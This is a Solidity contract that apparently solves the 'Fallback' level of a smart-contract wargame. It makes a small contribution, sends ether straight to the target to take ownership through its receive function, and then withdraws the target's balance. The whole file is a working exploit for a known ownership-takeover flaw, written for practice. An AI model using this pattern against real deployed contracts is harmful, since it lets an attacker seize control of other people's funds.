// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface FallbackI {
    function contribute() external payable;

    function getContribution() external;

    function withdraw() external;
}

contract Level1Solution is Ownable {
    address fallbackAddress;

    event ReceivedAmount(address indexed from, uint256 amountReceived);
    event Withdraw(uint256 withdrawAmount);

    constructor(address _address) payable {
        fallbackAddress = _address;

        // requirement of Fallback's receive function
        FallbackI(_address).contribute{value: 500 wei}();
    }

    function gainControlAndWithdraw() public onlyOwner {
        // send ether and gain control of the contract
        (bool sent, ) = payable(fallbackAddress).call{value: 0.0001 ether}("");
        require(sent, "Failed to send Ether");

        FallbackI(fallbackAddress).withdraw();
    }

    function withdraw() public onlyOwner {
        uint256 amount = address(this).balance;
        (bool sent, ) = owner().call{value: amount}("");
        require(sent, "Failed to send Ether");
        emit Withdraw(amount);
    }

    fallback() external {}

    receive() external payable {
        emit ReceivedAmount(msg.sender, msg.value);
    }
}
